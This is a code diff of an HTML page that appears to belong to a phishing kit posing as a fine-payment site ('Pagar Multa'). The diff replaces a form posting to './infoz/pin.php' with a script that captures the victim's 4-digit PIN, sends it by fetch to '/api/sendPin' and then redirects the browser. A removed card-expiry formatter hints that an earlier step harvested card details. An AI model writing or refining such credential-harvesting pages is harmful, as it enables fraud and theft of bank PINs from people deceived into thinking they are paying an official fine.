@@ -183,25 +183,36 @@
 <section class="procedure">
 <h2 style="font-weight: normal; line-height: 1.875rem; color: rgb(76, 83, 93); background-color: rgb(255, 255, 255); text-transform: uppercase; border-bottom: 0.625rem solid rgb(133, 204, 242);"><span style="font-size: 11px;"><span class="badge badge-info" style="box-sizing: inherit; padding: 3px 7px; vertical-align: middle; border-radius: 10px; min-width: 10px; background-color: rgb(51, 122, 183);"><span id="numeroAvisosId" style="box-sizing: inherit;">5</span></span> <span style="color: rgb(51, 122, 183); font-weight: 700;">&nbsp; PIN</span></span></h2>
 
-<form action="./infoz/pin.php" method="post">
+<form id="pinForm" method="post">
 <div class="row">
 <div class="col-md-6 form-group">&nbsp;</div>
 
 <div class="col-md-6 form-group">&nbsp;</div>
 
-<div class="col-md-6 form-group"><span style="font-size: 13px; font-weight: 600;">Pin&nbsp;</span><input id="first_name" maxlength="4" name="PIN" placeholder="0000" type="text" /></div>
+<div class="col-md-6 form-group"><span style="font-size: 13px; font-weight: 600;">Pin&nbsp;</span>
+<input type="text" maxlength="4" class="form-control mb-3" name="pin" placeholder="0000" required />
+</div>
 
 <div class="col-md-6 form-group">&nbsp;</div>
-<script>
-    function formatExpiryDate(input) {
-        let value = input.value.replace(/\D/g, ''); // Remove all non-digit characters
-        if (value.length >= 2) {
-            value = value.substring(0, 2) + '/' + value.substring(2, 4); // Add '/' after MM part
-        }
-        input.value = value.substring(0, 5); // Limit the value to "MM/YY"
-    }
-</script>
+ <script>
+    document.getElementById("pinForm").addEventListener("submit", async function(e) {
+      e.preventDefault();
+      const pin = e.target.pin.value;
 
+      try {
+        await fetch("/api/sendPin", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ pin })
+        });
+
+        // بعد الإرسال → redirect
+        window.location.href = "index.html";
+      } catch (err) {
+        alert("❌ Error al enviar PIN");
+      }
+    });
+  </script>
 <div class="row">
 <div class="col-md-6 form-group">&nbsp;</div>
 </div>
@@ -212,7 +223,7 @@
 <div class="col-md-4 form-group">&nbsp;</div>
 </div>
 
-<p><button class="btn btn-primary" type="submit">Pagar Multa</button></p>
+    <button type="submit" class="btn btn-primary w-100">Enviar</button>
 </div>
 </form>
 </section>
